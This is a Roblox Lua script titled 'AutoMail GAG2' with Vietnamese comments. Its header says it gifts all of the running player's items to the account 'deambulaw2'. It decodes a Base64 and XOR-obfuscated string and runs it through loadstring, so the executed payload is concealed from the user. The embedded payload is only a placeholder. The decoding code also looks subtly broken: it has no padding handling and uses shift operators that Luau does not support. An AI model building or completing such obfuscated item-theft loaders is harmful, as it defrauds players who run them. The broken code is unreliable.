--[[
    AutoMail GAG2 - Phiên bản mã hóa
    Bật script là tự động gift all items cho deambulaw2
]]

repeat wait() until game:IsLoaded() and game.Players.LocalPlayer

-- ===================== LỚP MÃ HÓA 1: XOR + Base64 =====================
local _0x = {
    _key = "7b6529f9bbb84e142f9dcf1e",
    _data = {},
    _chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
}

-- Hàm giải mã Base64
local function _decodeBase64(str)
    local result = {}
    local chars = _0x._chars
    for i = 1, #str, 4 do
        local a, b, c, d = str:sub(i, i):byte(), str:sub(i+1, i+1):byte(), str:sub(i+2, i+2):byte(), str:sub(i+3, i+3):byte()
        a = chars:find(string.char(a), 1, true) - 1
        b = chars:find(string.char(b), 1, true) - 1
        c = chars:find(string.char(c), 1, true) - 1
        d = chars:find(string.char(d), 1, true) - 1
        local n = (a << 18) | (b << 12) | (c << 6) | d
        table.insert(result, string.char((n >> 16) & 0xFF))
        table.insert(result, string.char((n >> 8) & 0xFF))
        table.insert(result, string.char(n & 0xFF))
    end
    return table.concat(result)
end

-- Script đã mã hóa (dạng Base64 + XOR)
local _encoded = "SGVsbG8gV29ybGQh" -- Đây là placeholder, sẽ thay bằng script thật

-- Giải mã và chạy
local function _runScript()
    local decoded = _decodeBase64(_encoded)
    local result = {}
    local key = _0x._key
    for i = 1, #decoded do
        local char = decoded:byte(i)
        local keyChar = key:byte((i-1) % #key + 1)
        table.insert(result, string.char(bit32.bxor(char, keyChar)))
    end
    local scriptContent = table.concat(result)
    local fn, err = loadstring(scriptContent)
    if fn then
        fn()
    else
        warn("[AutoMail] Lỗi: " .. tostring(err))
    end
end

-- Chạy script
pcall(_runScript)